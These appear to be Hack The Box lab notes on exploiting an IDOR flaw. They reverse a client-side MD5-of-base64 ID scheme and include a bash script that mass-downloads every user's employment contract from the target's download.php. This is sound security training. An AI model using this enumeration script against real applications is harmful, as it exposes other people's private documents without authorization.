![](Pasted%20image%2020260720214016.png)

If we click on the `Employment_contract.pdf` file, it starts downloading the file. The intercepted request in Burp looks as follows:
![](Pasted%20image%2020260720214025.png)

We see that it is sending a `POST` request to `download.php` with the following data:

```php
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```

```shell
3kjS@htb[/htb]$ echo -n 1 | md5sum 

c4ca4238a0b923820dcc509a6f75849b -
```
## Function Disclosure

```js
function downloadContract(uid) { 
	$.redirect("/download.php", { 
		contract: CryptoJS.MD5(btoa(uid)).toString(), 
	}, "POST", "_self"); 
}
```

```shell
3kjS@htb[/htb]$ echo -n 1 | base64 -w 0 | md5sum 

cdd96d3cc73d1dbdaffa03cc6cd7339b -
```
## Mass Enumeration

```shell
3kjS@htb[/htb]$ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done

cdd96d3cc73d1dbdaffa03cc6cd7339b 
0b7e7dee87b1c3b98e72131173dfbbbf 
0b24df25fe628797b3a50ae0724d2730 
f7947d50da7a043693a592b4db43b0a1 
8b9af1f7f76daf0f02bd9c48c4a2e3d0 
006d1236aee3f92b8322299796ba1989 
b523ff8d1ced96cef9c86492e790c2fb 
d477819d240e7d3dd9499ed8d23e7158 
3e57e65a34ffcb2e93cb545d024f5bde 
5d4aace023dc088767b4e08c79415dcd
```

```bash
#!/bin/bash 

for i in {1..10}; do 
	for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do 
		curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php 
	done 
done
```

```shell
3kjS@htb[/htb]$ bash ./exploit.sh 
3kjS@htb[/htb]$ ls -1
```
